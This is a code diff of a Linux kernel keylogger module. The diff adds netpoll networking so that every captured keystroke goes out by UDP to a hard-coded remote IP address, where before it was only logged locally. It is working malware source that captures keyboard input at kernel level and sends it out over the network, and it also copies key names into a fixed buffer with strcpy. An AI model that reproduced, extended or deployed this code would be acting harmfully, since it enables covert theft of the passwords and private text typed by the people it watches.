@@ -3,6 +3,7 @@
 #include <linux/init.h>
 #include <linux/keyboard.h>
 #include <linux/notifier.h>
+#include <linux/netpoll.h>
 
 #define KEY_PRESSED 1
 #define KEY_NOT_PRESSED 0
@@ -23,6 +24,9 @@ static const char* keys[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8
                         "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
                         "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};
 
+static struct notifier_block nb;
+static struct netpoll np;
+
 /*
 	keyboard_notifier_callback
 	must be of the type notifier_fn_t(notifier_block *nb,
@@ -36,16 +40,32 @@ int keyboard_notifier_callback(struct notifier_block *nb, unsigned long action, 
 		for action == KBD_KEYCODE
 	*/
 	if(action == KBD_KEYCODE && kb->down == KEY_PRESSED) {
-		printk(KERN_DEBUG "Key pressed: %s\n", keys[kb->value]);
+		char message[16];
+		
+		strcpy(message, keys[kb->value]);
+		//message[strlen(keys[kb->value])] = '\0';
+
+		printk(KERN_DEBUG "Sending message: %s\n", message);
+		message[0] = keys[kb->value][0];
+		netpoll_send_udp(&np, message, strlen(message));
 	}
 
 	return 0;
 } 
 
-static struct notifier_block nb;
-
 static int __init init_keylogger(void){
 	nb.notifier_call = keyboard_notifier_callback;
+
+	np.name = "KL";
+	strlcpy(np.dev_name, "eth0", IFNAMSIZ);
+	np.local_ip = (union inet_addr)htonl(0xC0A80179);
+	np.remote_ip = (union inet_addr)htonl(0xC0A8017E);
+	np.local_port = 8000;
+	np.remote_port = 8000;
+	memset(np.remote_mac, 0xff, ETH_ALEN);
+	netpoll_print_options(&np);
+	netpoll_setup(&np);
+
 	register_keyboard_notifier(&nb);
 
 	return 0;
